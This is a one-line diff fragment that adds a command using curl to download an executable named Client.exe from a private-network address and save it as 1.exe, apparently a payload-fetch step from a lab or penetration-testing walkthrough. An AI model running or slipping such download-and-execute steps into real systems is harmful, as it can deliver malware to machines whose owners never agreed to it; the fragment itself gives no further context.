@@ -1,0 +1,1 @@
+	>curl -o 1.exe http://192.168.1.192/Client.exe
